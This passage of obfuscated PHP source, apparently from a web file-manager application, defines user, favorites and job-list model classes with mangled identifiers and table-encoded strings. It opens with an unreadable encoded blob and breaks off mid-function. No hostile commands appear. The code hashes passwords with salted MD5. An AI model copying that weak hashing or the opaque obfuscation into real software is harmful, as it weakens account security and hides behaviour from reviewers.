NBaC+nLeZPJ3dpGR1AqMY5cs')."\100\365\242\160\122\47\352\224\214\314\240\20\364\151\22\361\156\63\157\222\74\340\176\274\310\243\354\307\26\51\64\204\65\210\142\320\166\202\75\275\212\375\317\363\275\316\11\151"."\161\13\36\160\335\226\113\351\144\77\20\4\43\255\71\371\240\45\11\123\153\2\110\26\362\126\137\72\220\134\1\0\334\261\245\354\205\320\1\263\117\272\124\240\154\14\330\143"."\x2\x48\x25\x2d\x31\x1a\x76\x65\x3b\x5a\x7f\xcd\x4b\x63\x2a\xd9\xc3\x3b\x5e\xc8\xdc\xfe\xf\xfa\xaf\xa8\x6e\xd5\xab\x0\x0", 10, -8))); goto B¦™š¬Ô£; CÙËè½™ª: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($½¬‚„Û¬) { $ØîÜœƒğ =& $_SERVER[óó‹¸‚å]; return array($ØîÜœƒğ[1974] => array(USER_ID, $ØîÜœƒğ[2304])); } protected function listData() { $ŒÁµ×ğÜ =& $_SERVER[óó‹¸‚å]; $¹¥ˆÖ° = array($ŒÁµ×ğÜ[1665] => USER_ID, $ŒÁµ×ğÜ[484] => 0); $Ş¸ú¡¾ = $ŒÁµ×ğÜ[2305]; $å¹ª¹Óñ = $this->field($Ş¸ú¡¾)->where($¹¥ˆÖ°)->order($ŒÁµ×ğÜ[2306])->select(); return $å¹ª¹Óñ ? $å¹ª¹Óñ : array(); } protected function resetCache() { } protected function listView() { $Ëî‚µÔ =& $_SERVER[óó‹¸‚å]; $ŒÕüÃı = $this->listData(); $Ä»ç¥¼˜ = array_filter_by_field($ŒÕüÃı, $Ëî‚µÔ[33], $Ëî‚µÔ[416]); $ËËÛ¿¹ = array_to_keyvalue($Ä»ç¥¼˜, $Ëî‚µÔ[12], $Ëî‚µÔ[84]); if (!$ËËÛ¿¹) { return $ŒÕüÃı; } $¢Ù»ÂÛ = 2000; $±¤ŸŸÚÈ = array($Ëî‚µÔ[417] => array($Ëî‚µÔ[418], $ËËÛ¿¹)); $„¾µÌ¸¬ = Model($Ëî‚µÔ[829])->listSource($±¤ŸŸÚÈ, $¢Ù»ÂÛ); $„¾µÌ¸¬ = array_merge($„¾µÌ¸¬[$Ëî‚µÔ[83]], $„¾µÌ¸¬[$Ëî‚µÔ[82]]); $„¾µÌ¸¬ = array_to_keyvalue($„¾µÌ¸¬, $Ëî‚µÔ[402]); foreach ($ŒÕüÃı as $—ëï›Õæ => $ş¡Üœ‘–) { $­ÛÌò‹¼ = $„¾µÌ¸¬[$ş¡Üœ‘–[$Ëî‚µÔ[84]]]; $­ÛÌò‹¼ = $­ÛÌò‹¼ ? $­ÛÌò‹¼ : array(); $ŒÕüÃı[$—ëï›Õæ] = array_merge($­ÛÌò‹¼, $ş¡Üœ‘–); } return $ŒÕüÃı; } protected function addFav($—…ºêĞ, $¹†«Åª² = '', $¦¨ÕÎ¨¨ = "\x73\x6f\165\x72\143\x65") { $¦š™¹‚ë =& $_SERVER[óó‹¸‚å]; $ûŞ»ûÕÄ = array($¦š™¹‚ë[1665] => USER_ID, $¦š™¹‚ë[484] => 0, $¦š™¹‚ë[422] => $¦¨ÕÎ¨¨, $¦š™¹‚ë[421] => $—…ºêĞ); if ($this->where($ûŞ»ûÕÄ)->find()) { return !1; } $ûŞ»ûÕÄ = array($¦š™¹‚ë[1665] => USER_ID, $¦š™¹‚ë[484] => 0); $Ø½÷ˆÍ³ = $this->where($ûŞ»ûÕÄ)->max($¦š™¹‚ë[1887]); if (!$Ø½÷ˆÍ³) { $Ø½÷ˆÍ³ = 0; } if (!$¹†«Åª² && $¦¨ÕÎ¨¨ == $¦š™¹‚ë[416]) { $€ç§®Ÿô = Model($¦š™¹‚ë[1343])->where(array($¦š™¹‚ë[417] => $—…ºêĞ))->find(); if (!$€ç§®Ÿô) { return !1; } $¹†«Åª² = $€ç§®Ÿô[$¦š™¹‚ë[32]]; } $¹†«Åª² = $this->getAutoName($¹†«Åª²); $–ñÒÊâÕ = array($¦š™¹‚ë[1665] => USER_ID, $¦š™¹‚ë[484] => 0, $¦š™¹‚ë[420] => $¹†«Åª², $¦š™¹‚ë[421] => $—…ºêĞ, $¦š™¹‚ë[422] => $¦¨ÕÎ¨¨, $¦š™¹‚ë[1867] => $Ø½÷ˆÍ³ + 1); return $this->add($–ñÒÊâÕ); } protected function remove($èŒ´ûÇ) { $ÑˆØ±±” =& $_SERVER[óó‹¸‚å]; $æØ«é¨í = array($ÑˆØ±±”[1665] => USER_ID, $ÑˆØ±±”[419] => $èŒ´ûÇ); return $this->where($æØ«é¨í)->delete(); } protected function removeByName($“×³îÆ) { $»˜¦§ÂÖ =& $_SERVER[óó‹¸‚å]; $–Ù®²â = array($»˜¦§ÂÖ[1665] => USER_ID, $»˜¦§ÂÖ[420] => $“×³îÆ, $»˜¦§ÂÖ[484] => 0); return $this->where($–Ù®²â)->delete(); } protected function rename($öã²äÓ, $ÍÔ¯œÎà) { $»—Ë¨ƒŠ =& $_SERVER[óó‹¸‚å]; if ($öã²äÓ == $ÍÔ¯œÎà) { return !1; } $×œÒÚÛÖ = $this->getAutoName($ÍÔ¯œÎà); if ($ÍÔ¯œÎà != $×œÒÚÛÖ) { return !1; } $Î·ÇÏ–  = array($»—Ë¨ƒŠ[1665] => USER_ID, $»—Ë¨ƒŠ[484] => 0, $»—Ë¨ƒŠ[32] => $öã²äÓ); return $this->where($Î·ÇÏ– )->save(array($»—Ë¨ƒŠ[32] => $ÍÔ¯œÎà)); } protected function resetSort($¶Æ¸±ß®) { $šê™äÑÔ =& $_SERVER[óó‹¸‚å]; $¶Æ¸±ß® = is_array($¶Æ¸±ß®) ? $¶Æ¸±ß® : array(); $Æê‡áÆ› = array($šê™äÑÔ[1665] => USER_ID); for ($À–ôæş§ = 0; $À–ôæş§ < count($¶Æ¸±ß®); $À–ôæş§++) { $Æê‡áÆ›[$šê™äÑÔ[419]] = $¶Æ¸±ß®[$À–ôæş§]; $this->where($Æê‡áÆ›)->save(array($šê™äÑÔ[1867] => $À–ôæş§ + 1)); } return !0; } protected function moveTop($Ã¥â¹óà) { $•¹½â‹õ =& $_SERVER[óó‹¸‚å]; $Èğ¾ŸĞ¦ = array($•¹½â‹õ[1665] => USER_ID, $•¹½â‹õ[484] => 0); $‹…£ó÷Õ = $this->where($Èğ¾ŸĞ¦)->where(array($•¹½â‹õ[32] => $Ã¥â¹óà))->find(); if (!$‹…£ó÷Õ) { return; } $‚Ìà‚Ü = $this->field($•¹½â‹õ[399])->where($Èğ¾ŸĞ¦)->order($•¹½â‹õ[2306])->select(); $‚Ìà‚Ü = array_to_keyvalue($‚Ìà‚Ü, $•¹½â‹õ[12], $•¹½â‹õ[399]); $ä„µËùè = $‚Ìà‚Ü; $‚Ìà‚Ü = array_remove_value($‚Ìà‚Ü, $‹…£ó÷Õ[$•¹½â‹õ[399]]); array_unshift($‚Ìà‚Ü, $‹…£ó÷Õ[$•¹½â‹õ[399]]); return $this->resetSort($‚Ìà‚Ü); } protected function moveBottom($ö…èÀÔ) { $¿ã×¬·î =& $_SERVER[óó‹¸‚å]; $¤ÂŸ¶ÑÜ = array($¿ã×¬·î[1665] => USER_ID, $¿ã×¬·î[484] => 0); $Ü€¾æ„„ = $this->where($¤ÂŸ¶ÑÜ)->max($¿ã×¬·î[1887]); $·çÉÔù² = array($¿ã×¬·î[1887] => $Ü€¾æ„„ + 1); return $this->where($¤ÂŸ¶ÑÜ)->where(array($¿ã×¬·î[32] => $ö…èÀÔ))->save($·çÉÔù²); } private function getAutoName($Ü¸‹òçª) { $ÇƒºÚù€ =& $_SERVER[óó‹¸‚å]; $‡³…ÃœÕ = array($ÇƒºÚù€[1665] => USER_ID, $ÇƒºÚù€[484] => 0); $¿®Ó¡ŸÁ = $this->field($ÇƒºÚù€[32])->where($‡³…ÃœÕ)->select(); $¿®Ó¡ŸÁ = array_to_keyvalue($¿®Ó¡ŸÁ, $ÇƒºÚù€[12], $ÇƒºÚù€[32]); if (!$¿®Ó¡ŸÁ || !in_array($Ü¸‹òçª, $¿®Ó¡ŸÁ)) { return $Ü¸‹òçª; } for ($¡£Ü£„ = 0; $¡£Ü£„ < count($¿®Ó¡ŸÁ); $¡£Ü£„++) { if (!in_array($Ü¸‹òçª . "\50{$¡£Ü£„}\x29", $¿®Ó¡ŸÁ)) { return $Ü¸‹òçª . "\x28{$¡£Ü£„}\51"; } } return $Ü¸‹òçª . "\50{$¡£Ü£„}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x6a\157\142\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\144\x65\163\x63", "\x73\157\162\x74"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\x62\x4c\151\x73\164"; public function listData($ÓÏ§ú¼È = false, $¥¼µÖû® = "\163\157\162\x74", $õ›®ÀÔâ = false) { return parent::listData($ÓÏ§ú¼È, $¥¼µÖû®, $õ›®ÀÔâ); } public function remove($¥¨­«Š) { return parent::remove($¥¨­«Š); } public function add($§˜¤°é) { $Ÿ‡ÀŸ÷¡ =& $_SERVER[óó‹¸‚å]; if ($this->findByName($§˜¤°é[$Ÿ‡ÀŸ÷¡[32]])) { return !1; } $§˜¤°é[$Ÿ‡ÀŸ÷¡[1887]] = $this->getSort(); return parent::insert($§˜¤°é); } private function getSort() { $Õñç®™à =& $_SERVER[óó‹¸‚å]; $¶ì¤«Ä‚ = parent::listData(); $ŠÏËæŒ« = array_to_keyvalue($¶ì¤«Ä‚, $Õñç®™à[12], $Õñç®™à[1887]); return empty($ŠÏËæŒ«) ? 0 : max($ŠÏËæŒ«) + 1; } public function update($Œ½¹¼˜Ä, $ÏÕêÊš) { $¤‘ö¸Œ€ =& $_SERVER[óó‹¸‚å]; $ş—ù † = parent::listData($Œ½¹¼˜Ä); $ê±·èƒª = $this->findByName($ÏÕêÊš[$¤‘ö¸Œ€[32]]); if (!$ş—ù † || $ê±·èƒª && $ê±·èƒª[$¤‘ö¸Œ€[399]] != $ş—ù †[$¤‘ö¸Œ€[399]]) { return !1; } return parent::update($Œ½¹¼˜Ä, $ÏÕêÊš); } public function setUserJob($ÍŒª‰Şá, $øîœ®è) { $¸ÔÔ›ô³ =& $_SERVER[óó‹¸‚å]; if (!is_array($øîœ®è)) { $øîœ®è = array($øîœ®è); } $æä§êî = parent::listData(); $åÀö’™× = array_to_keyvalue($æä§êî, $¸ÔÔ›ô³[32]); $Áî¼ŸÒ¨ = $¸ÔÔ›ô³[378]; foreach ($øîœ®è as $¤÷™ø¦³) { if ($åÀö’™×[$¤÷™ø¦³]) { $Áî¼ŸÒ¨ .= $åÀö’™×[$¤÷™ø¦³][$¸ÔÔ›ô³[399]] . $¸ÔÔ›ô³[50]; } else { $Šşæ¶“ = $this->add($¤÷™ø¦³); $Áî¼ŸÒ¨ .= $Šşæ¶“ . $¸ÔÔ›ô³[50]; } } $Áî¼ŸÒ¨ = rtrim($Áî¼ŸÒ¨, $¸ÔÔ›ô³[50]); Model($¸ÔÔ›ô³[535])->metaSet($ÍŒª‰Şá, self::JOB_KEY, $Áî¼ŸÒ¨); } public function getUserJob($Šú™€®†) { $™Ğã£Ì× = Model($_SERVER[óó‹¸‚å][535])->metaGet($Šú™€®†); return $this->getUserJobInfo($™Ğã£Ì×[self::JOB_KEY]); } public function getUserJobInfo($É“ó¦øÎ) { $Ú£•Íú„ =& $_SERVER[óó‹¸‚å]; $¤ËĞÇüÖ = explode($Ú£•Íú„[50], $É“ó¦øÎ); $ÚŠõè’§ = parent::listData(); $ÚŠõè’§ = array_remove_key($ÚŠõè’§, $Ú£•Íú„[200]); $ä°äÚÖ = array(); foreach ($¤ËĞÇüÖ as $éì¬’»Î) { if (isset($ÚŠõè’§[$éì¬’»Î])) { $ä°äÚÖ[] = $ÚŠõè’§[$éì¬’»Î]; } } return $ä°äÚÖ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\155\145" => "\165\x73\145\162\x5f\155\145\164\x61", "\x6d\x65\x74\141\x46\151\x65\x6c\144" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\165\163\145\162\111\104\54\x6e\151\143\x6b\116\141\155\x65\x2c\156\x61\x6d\x65\54\x61\x76\x61\x74\141\x72\x2c\x73\x65\x78\54\163\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ Û©ĞÎ) { $²„¥Å‚˜ =& $_SERVER[óó‹¸‚å]; $Ğ¹ÚÇÇ– = $²„¥Å‚˜[2307]; return array($²„¥Å‚˜[1941] => array($ Û©ĞÎ[0], $Ğ¹ÚÇÇ–), $²„¥Å‚˜[1943] => array($ Û©ĞÎ[0], $Ğ¹ÚÇÇ–), $²„¥Å‚˜[2308] => array($ Û©ĞÎ[0], $Ğ¹ÚÇÇ–)); } protected function getInfo($ĞÖ†›, $Şàºø†â = false) { $¡Å×­ã = $this->getInfoSimple($ĞÖ†›); if (!is_array($¡Å×­ã)) { return array(); } if ($Şàºø†â) { return $this->_getInfoApply($¡Å×­ã); } return $this->cacheFunctionGet($_SERVER[óó‹¸‚å][1945], $ĞÖ†›); } protected function getInfoFull($Û¼ÛÕ„Ï, $úËí— = false) { $“°ÃÆÔä = $this->getInfoSimple($Û¼ÛÕ„Ï); if (!is_array($“°ÃÆÔä)) { return array(); } if ($úËí—) { return $this->_getInfoApply($“°ÃÆÔä, !0); } return $this->cacheFunctionGet($_SERVER[óó‹¸‚å][2309], $Û¼ÛÕ„Ï); } private function _getInfoApply($şĞ›î¾ú, $¼Â‹½ÎÄ = false) { $¯â¶Ö’ =& $_SERVER[óó‹¸‚å]; if (!$şĞ›î¾ú) { return $şĞ›î¾ú; } $şÛºûğí = md5($¯â¶Ö’[2310] . $şĞ›î¾ú[$¯â¶Ö’[896]] . $¯â¶Ö’[2311] . $şĞ›î¾ú[$¯â¶Ö’[32]]); $şĞ›î¾ú = $this->_listDataApplyItem($şĞ›î¾ú); $¾œæâ½ö = Model($¯â¶Ö’[1343])->metaGet($şĞ›î¾ú[$¯â¶Ö’[86]][$¯â¶Ö’[402]]); $şĞ›î¾ú[$¯â¶Ö’[2312]] = $şÛºûğí; $şĞ›î¾ú[$¯â¶Ö’[86]][$¯â¶Ö’[2132]] = isset($¾œæâ½ö[$¯â¶Ö’[2133]]) ? $¾œæâ½ö[$¯â¶Ö’[2133]] : null; if ($¼Â‹½ÎÄ) { $şĞ›î¾ú[$¯â¶Ö’[466]] = $this->metaGet($şĞ›î¾ú[$¯â¶Ö’[1674]]); } return $şĞ›î¾ú; } protected function getInfoSimple($ÒŞ×ŒÃÅ, $Ê¼»Ù”ª = false) { $–“úÈúå =& $_SERVER[óó‹¸‚å]; if (!$ÒŞ×ŒÃÅ) { return array(); } if ($Ê¼»Ù”ª) { $Üé›´ŠÚ = $this->where(array($–“úÈúå[1674] => intval($ÒŞ×ŒÃÅ)))->find(); if (!is_array($Üé›´ŠÚ)) { return array(); } $Üé›´ŠÚ[$–“úÈúå[543]] = Action($–“úÈúå[2313])->parseUrl($Üé›´ŠÚ[$–“úÈúå[543]]); return $Üé›´ŠÚ; } return $this->cacheFunctionGet($–“úÈúå[1946], $ÒŞ×ŒÃÅ); } protected function getInfoSimpleOuter($ôÈîÁü‰) { $ğîˆò =& $_SERVER[óó‹¸‚å]; if (!$ôÈîÁü‰ || $ôÈîÁü‰ == 0) { return array($ğîˆò[1674] => $ğîˆò[197], $ğîˆò[32] => $ğîˆò[162] . LNG($ğîˆò[2314]) . $ğîˆò[164], $ğîˆò[543] => STATIC_PATH . $ğîˆò[2315]); } $¹™å¶Ô€ = $this->cacheFunctionGet($ğîˆò[1946], $ôÈîÁü‰); $¿èƒğ‰ó = array_field_key($¹™å¶Ô€, explode($ğîˆò[50], $this->simpleField)); if (!$¿èƒğ‰ó) { return array($ğîˆò[1674] => $ğîˆò[1196], $ğîˆò[32] => $ğîˆò[162] . LNG($ğîˆò[2316]) . $ğîˆò[164], $ğîˆò[543] => STATIC_PATH . $ğîˆò[2317]); } $¿èƒğ‰ó[$ğîˆò[543]] = Action($ğîˆò[2313])->parseUrl($¿èƒğ‰ó[$ğîˆò[543]]); return $¿èƒğ‰ó; } protected function groupUser($°¹òË´¦) { } public static function errorLang($£÷‹€) { $³é¶óœñ =& $_SERVER[óó‹¸‚å]; $îõÚˆİ· = array(self::ERROR_USER_NOT_EXISTS => $³é¶óœñ[2318], self::ERROR_USER_PASSWORD_ERROR => $³é¶óœñ[2319], self::ERROR_USER_EXIST_NAME => $³é¶óœñ[2320], self::ERROR_USER_EXIST_PHONE => $³é¶óœñ[2321], self::ERROR_USER_EXIST_EMAIL => $³é¶óœñ[2322], self::ERROR_USER_LOGIN_LOCK => $³é¶óœñ[2323], self::ERROR_IP_NOT_ALLOW => $³é¶óœñ[2324], self::ERROR_USER_EXIST_NICKNAME => $³é¶óœñ[2325]); return LNG($îõÚˆİ·[$£÷‹€]); } public function getInfoByMeta($šø»ê¼, $éË¢àÎ) { $«‡ÍåÙØ =& $_SERVER[óó‹¸‚å]; $÷Ù©ÃÖß = Model($«‡ÍåÙØ[2326])->where(array($«‡ÍåÙØ[94] => $šø»ê¼, $«‡ÍåÙØ[374] => $éË¢àÎ))->find(); if ($÷Ù©ÃÖß) { return $this->getInfo($÷Ù©ÃÖß[$«‡ÍåÙØ[1674]]); } return !1; } public function userLoginCheck($ïÇÒš×ˆ, $‘Îñ¹Œ) { $©Ü¦„ƒü =& $_SERVER[óó‹¸‚å]; $¶ã×…›Ï = $this->userLoginFind($ïÇÒš×ˆ); if (!$¶ã×…›Ï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¶ã×…›Ï[$©Ü¦„ƒü[1674]], $‘Îñ¹Œ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¶ã×…›Ï[$©Ü¦„ƒü[1674]]); } public function userLoginFind($úĞı¢ÎÒ) { $¼¾áÜÊÙ =& $_SERVER[óó‹¸‚å]; $Ÿ–Ëáº• = array($¼¾áÜÊÙ[32] => $úĞı¢ÎÒ, $¼¾áÜÊÙ[542] => $úĞı¢ÎÒ, $¼¾áÜÊÙ[305] => $úĞı¢ÎÒ, $¼¾áÜÊÙ[2327] => $úĞı¢ÎÒ, $¼¾áÜÊÙ[1007] => $¼¾áÜÊÙ[1009]); if ($this->nickNameRpt()) { unset($Ÿ–Ëáº•[$¼¾áÜÊÙ[542]]); } return $this->where($Ÿ–Ëáº•)->find(); } public function clearCache($èÙíÖ™ø) { $Û²ÌËöá =& $_SERVER[óó‹¸‚å]; $this->cacheFunctionClear($Û²ÌËöá[1945], $èÙíÖ™ø); $this->cacheFunctionClear($Û²ÌËöá[1946], $èÙíÖ™ø); $this->cacheFunctionClear($Û²ÌËöá[2309], $èÙíÖ™ø); } public function userPasswordCheck($ë¯õ°ø, $Œôß•š) { $­¸¾ƒîî =& $_SERVER[óó‹¸‚å]; $îºÀåÎÔ = $this->where(array($­¸¾ƒîî[1674] => intval($ë¯õ°ø)))->find(); $ç…ãõ•· = $this->metaGet($ë¯õ°ø); $ƒ£§°³— = isset($ç…ãõ•·[$­¸¾ƒîî[2328]]) ? $ç…ãõ•·[$­¸¾ƒîî[2328]] : $­¸¾ƒîî[12]; if (md5($ƒ£§°³— . trim($Œôß•š)) !== $îºÀåÎÔ[$­¸¾ƒîî[896]]) { return !1; } return !0; } public function userAdd($šÉ‹¥Çë) { $±äÇÉ¤ˆ =& $_SERVER[óó‹¸‚å]; $¹„ˆç¥à = array($±äÇÉ¤ˆ[420] => $šÉ‹¥Çë[$±äÇÉ¤ˆ[32]], $±äÇÉ¤ˆ[2329] => $šÉ‹¥Çë[$±äÇÉ¤ˆ[1555]], $±äÇÉ¤ˆ[2330] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[305]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[305]] : $±äÇÉ¤ˆ[12], $±äÇÉ¤ˆ[2331] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[2327]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[2327]] : $±äÇÉ¤ˆ[12], $±äÇÉ¤ˆ[2332] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[542]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[542]] : $šÉ‹¥Çë[$±äÇÉ¤ˆ[32]], $±äÇÉ¤ˆ[2333] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[543]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[543]] : $±äÇÉ¤ˆ[12], $±äÇÉ¤ˆ[2334] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[2335]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[2335]] : 1, $±äÇÉ¤ˆ[2336] => $šÉ‹¥Çë[$±äÇÉ¤ˆ[896]], $±äÇÉ¤ˆ[1947] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[1850]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[1850]] : 1024 * 1024 * 20, $±äÇÉ¤ˆ[1948] => 0, $±äÇÉ¤ˆ[2337] => 0, $±äÇÉ¤ˆ[1992] => isset($šÉ‹¥Çë[$±äÇÉ¤ˆ[754]]) ? $šÉ‹¥Çë[$±äÇÉ¤ˆ[754]] : 1); if (!empty($šÉ‹¥Çë[$±äÇÉ¤ˆ[1674]])) { $¹„ˆç¥à[$±äÇÉ¤ˆ[1674]] = $šÉ‹¥Çë[$±äÇÉ¤ˆ[1674]]; } $†”õ†ŞØ = $this->_checkExist($šÉ‹¥Çë); if ($†”õ†ŞØ !== !0) { return $†”õ†ŞØ; } if (!empty($¹„ˆç¥à[$±äÇÉ¤ˆ[543]]) && strlen($¹„ˆç¥à[$±äÇÉ¤ˆ[543]]) > 255) { $¹„ˆç¥à[$±äÇÉ¤ˆ[543]] = $±äÇÉ¤ˆ[12]; } $â‚¦ôŸ = $this->add($¹„ˆç¥à); $ç¸ÉÆ©‚ = array($±äÇÉ¤ˆ[2336] => $¹„ˆç¥à[$±äÇÉ¤ˆ[896]], $±äÇÉ¤ˆ[2332] => $¹„ˆç¥à[$±äÇÉ¤ˆ[542]]); $this->userEdit($â‚¦ôŸ, $ç¸ÉÆ©‚); Model($±äÇÉ¤ˆ[1343])->userRootAdd($â‚¦ôŸ); return $â‚¦ôŸ; } protected function userEditTest($—á§×Ÿ£, $ö ¡¤ã¦) { return $this->call($_SERVER[óó‹¸‚å][2338], $—á§×Ÿ£, $ö ¡¤ã¦); } protected function userEdit($ÔìÎ™‡ç, $ñ’“·«¨) { $‰‰Ú²¨Ú =& $_SERVER[óó‹¸‚å]; $‚¤úµÀÛ = $this->getInfoSimple($ÔìÎ™‡ç); if (!$‚¤úµÀÛ) { return !1; } $¨à³øô¾ = $this->_checkExist($ñ’“·«¨, $ÔìÎ™‡ç); if ($¨à³øô¾ !== !0) { return $¨à³øô¾; } if (isset($ñ’“·«¨[$‰‰Ú²¨Ú[896]]) && trim($ñ’“·«¨[$‰‰Ú²¨Ú[896]]) != $‰‰Ú²¨Ú[12]) { $İÄ ¼€¿ = $this->metaGet($ÔìÎ™‡ç); if (empty($İÄ ¼€¿[$‰‰Ú²¨Ú[2328]])) { $İÄ ¼€¿[$‰‰Ú²¨Ú[2328]] = rand_string(10); Model($‰‰Ú²¨Ú[513])->metaSet($ÔìÎ™‡ç, $‰‰Ú²¨Ú[2328], $İÄ ¼€¿[$‰‰Ú²¨Ú[2328]]); } $ñ’“·«¨[$‰‰Ú²¨Ú[896]] = md5($İÄ ¼€¿[$‰‰Ú²¨Ú[2328]] . trim($ñ’“·«¨[$‰‰Ú²¨Ú[896]])); } else { unset($ñ’“·«¨[$‰‰Ú²¨Ú[896]]); } if (!empty($ñ’“·«¨[$‰‰Ú²¨Ú[543]]) && strlen($ñ’“·«¨[$‰‰Ú²¨Ú[543]]) > 255) { $ñ’“·«¨[$‰‰Ú²¨Ú[543]] = $‰‰Ú²¨Ú[12]; } $this->where(array($‰‰Ú²¨Ú[1665] => $ÔìÎ™‡ç))->save($ñ’“·«¨); if (isset($ñ’“·«¨[$‰‰Ú²¨Ú[542]])) { $this->setNamePinyin($ÔìÎ™‡ç, $ñ’“·«¨[$‰‰Ú²¨Ú[542]]); } $this->clearCache($ÔìÎ™‡ç); return !0; } public function setNamePinyin($£çÎ¤Ëç, $ÒâòĞ = false) { $ˆµ™†öõ =& $_SERVER[óó‹¸‚å]; if (!$ÒâòĞ) { $Ï…ˆªµ¸ = $this->getInfoSimple($£çÎ¤Ëç); $ÒâòĞ = $Ï…ˆªµ¸[$ˆµ™†öõ[542]] ? $Ï…ˆªµ¸[$ˆµ™†öõ[542]] : $Ï…ˆªµ¸[$ˆµ™†öõ[32]]; } $ÅÒŞï‚ = Model($ˆµ™†öõ[535]); if (!Input::check($ÒâòĞ, $ˆµ™†öõ[593])) { return $ÅÒŞï‚->metaSet($£çÎ¤Ëç, array($ˆµ™†öõ[465] => $ˆµ™†öõ[12], $ˆµ™†öõ[464] => $ˆµ™†öõ[12])); } return $ÅÒŞï‚->metaSet($£çÎ¤Ëç, array($ˆµ™†öõ[465] => str_replace($ˆµ™†öõ[53], $ˆµ™†öõ[12], Pinyin::get($ÒâòĞ)), $ˆµ™†öõ[464] => Pinyin::get($ÒâòĞ, $ˆµ™†öõ[594]))); } private function nickNameRpt() { $³–¢ÂÆå =& $_SERVER[óó‹¸‚å]; $·ù¯ÇëŞ = Model($³–¢ÂÆå[774])->get($³–¢ÂÆå[2339]); $ÖØÃæì§ = $GLOBALS[$³–¢ÂÆå[6]][$³–¢ÂÆå[381]][$³–¢ÂÆå[2339]]; $ŠÌØ¾É = !is_null($·ù¯ÇëŞ) ? $·ù¯ÇëŞ : $ÖØÃæì§; return !!$ŠÌØ¾É; } private function _checkExist($øÂ¤ì¶Ú, $‘€™×¯» = false) { $ûÁÁäÍí =& $_SERVER[óó‹¸‚å]; $Â›ò¾Ÿ´ = array($ûÁÁäÍí[32] => UserModel::ERROR_USER_EXIST_NAME, $ûÁÁäÍí[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ûÁÁäÍí[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ûÁÁäÍí[2327] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Â›ò¾Ÿ´[$ûÁÁäÍí[542]]); } $Ğíß÷‰ = $‘€™×¯» ? array($ûÁÁäÍí[1674] => array($ûÁÁäÍí[2340], $‘€™×¯»)) : array(); foreach ($Â›ò¾Ÿ´ as $›ã¯îÕ => $ÌÜŒİş×) { $²ß³Ò¤õ = array(); foreach ($Â›ò¾Ÿ´ as $³·€’û² => $ïêïÆÔø) { if (isset($øÂ¤ì¶Ú[$³·€’û²]) && $øÂ¤ì¶Ú[$³·€’û²]) { $²ß³Ò¤õ[] = $øÂ¤ì¶Ú[$³·€’û²]; } } if (!$²ß³Ò¤õ) { continue; } $³ÎÎ£Ù´ = array_merge(array($›ã¯îÕ => array($ûÁÁäÍí[7], $²ß³Ò¤õ)), $Ğíß÷‰); $Ş÷“Ïú = $this->where($³ÎÎ£Ù´)->find(); if ($Ş÷“Ïú) { return $ÌÜŒİş×; } } return !0; } public function userListInfo($¢ğË¥­) { $‚Û”äñ¨ =& $_SERVER[óó‹¸‚å]; $œË­ê– = array(); $¢ğË¥­ = is_array($¢ğË¥­) ? array_unique($¢ğË¥­) : array(); if (!$¢ğË¥­) { return $œË­ê–; } if (count($¢ğË¥­) < 20) { foreach ($¢ğË¥­ as $¤¾ŠÛë—) { $œË­ê–[$¤¾ŠÛë— . $‚Û”äñ¨[12]] = $this->getInfoSimpleOuter($¤¾ŠÛë—); } } else { $Œš¾•´¿ = array($‚Û”äñ¨[1665] => array($‚Û”äñ¨[418], $¢ğË¥­)); if (count($¢ğË¥­) == 1) { $Œš¾•´¿ = array($‚Û”äñ¨[1665] => $¢ğË¥­[0]); } $í™µƒš = Model($‚Û”äñ¨[513])->field($this->simpleField)->where($Œš¾•´¿)->select(); $í™µƒš = array_to_keyvalue($í™µƒš, $‚Û”äñ¨[1674]); foreach ($¢ğË¥­ as $¤¾ŠÛë—) { $ƒÅœ²Èé = $í™µƒš[$¤¾ŠÛë—]; if (!$ƒÅœ²Èé) { $œË­ê–[$¤¾ŠÛë— . $‚Û”äñ¨[12]] = $this->getInfoSimpleOuter($¤¾ŠÛë—); continue; } $ƒÅœ²Èé[$‚Û”äñ¨[543]] = Action($‚Û”äñ¨[2313])->parseUrl($ƒÅœ²Èé[$‚Û”äñ¨[543]]); $œË­ê–[$¤¾ŠÛë— . $‚Û”äñ¨[12]] = $ƒÅœ²Èé; } } return $œË­ê–; } protected function userStatus($ĞÔ¶ß÷, $è‚¨½Üü) { $ÄõãÔƒÕ = $this->getInfoSimple($ĞÔ¶ß÷); if (!$ÄõãÔƒÕ) { return !1; } $ÅÁ·Çä = array($_SERVER[óó‹¸‚å][754] => $è‚¨½Üü); return $this->userEdit($ĞÔ¶ß÷, $ÅÁ·Çä); } protected function userRemove($ªìÈÈÁé) { $üÉÆ¿¿ =& $_SERVER[óó‹¸‚å]; $éà˜‚™ = $this->getInfoSimple($ªìÈÈÁé); if 